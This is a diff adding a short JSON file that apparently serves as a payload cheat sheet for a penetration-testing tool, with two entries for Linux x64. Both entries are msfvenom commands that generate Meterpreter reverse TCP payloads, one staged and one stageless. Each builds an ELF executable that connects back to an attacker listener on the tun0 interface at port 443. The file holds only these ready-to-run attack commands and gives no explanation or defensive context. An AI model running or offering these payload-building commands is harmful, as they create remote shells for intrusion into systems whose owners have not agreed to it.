@@ -1,0 +1,6 @@
+{
+    "Linux":{
+        "Meterpreter x64 Reverse TCP (Staged)":"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f elf -o x64.met.staged.elf",
+        "Meterpreter x64 Reverse TCP (Stageless)":"msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=tun0 LPORT=443 -f elf -o x64.met.stageless.elf"
+    }
+}
